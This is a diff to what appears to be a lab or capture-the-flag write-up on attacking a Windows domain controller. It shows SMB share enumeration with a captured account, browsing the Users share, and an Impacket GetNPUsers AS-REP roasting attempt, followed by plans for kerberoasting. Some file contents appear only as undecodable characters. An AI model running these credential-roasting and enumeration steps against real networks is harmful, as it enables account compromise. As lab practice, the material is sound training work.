@@ -188,4 +188,35 @@ SMB         10.201.9.75     445    DC01             NETLOGON        READ        
 SMB         10.201.9.75     445    DC01             SYSVOL          READ            Logon server share 
 SMB         10.201.9.75     445    DC01             Users           READ     
 
-it appears we now have greater read access to other shares particularly Users share, however that juicy backup share that is looking me in the eye has not turned  its pretty head
+it appears we now have greater read access to other shares particularly Users share, however that juicy backup share that is looking me in the eye has not turned  its pretty head. 
+
+root@ip-10-201-48-39:~# smbclient //10.201.9.75/Users -U ybob317
+Password for [WORKGROUP\ybob317]:
+Try "help" to get a list of possible commands.
+smb: \> ls
+  .                                  DR        0  Thu Jul  4 23:48:22 2024
+  ..                                DHS        0  Mon Nov 10 16:40:06 2025
+  admin                               D        0  Thu Jul  4 23:49:01 2024
+  Administrator                       D        0  Mon Nov 10 16:49:32 2025
+  All Users                       DHSrn        0  Sat May  8 09:26:16 2021
+  Default                           DHR        0  Sun Jun 16 03:51:08 2024
+  Default User                    DHSrn        0  Sat May  8 09:26:16 2021
+  desktop.ini                       AHS      174  Sat May  8 09:14:03 2021
+  Public                             DR        0  Sat Jun 15 18:54:32 2024
+  ybob317                             D        0  Mon Jun 17 18:24:32 2024
+
+cant get into admin or Administrator directories desktop.ini reads as follows
+
+\ufffd\ufffd
+[.ShellClassInfo]
+LocalizedResourceName=@%SystemRoot%\system32\shell32.dll,-21813
+
+ntuser.ini in the ytbob317 reads as \ufffd\ufffd
+
+root@ip-10-201-48-39:~# GetNPUsers.py SOUPEDECODE.LOCAL/ -dc-ip 10.201.9.75 -usersfile users.txt -format hashcat -outputfile hashes.txt
+
+root@ip-10-201-48-39:~# cat hashes.txt
+<blank>
+
+Checking if any accounts are ASREP roastable, it appears none are. Moving on to normal kerberoasting.
+
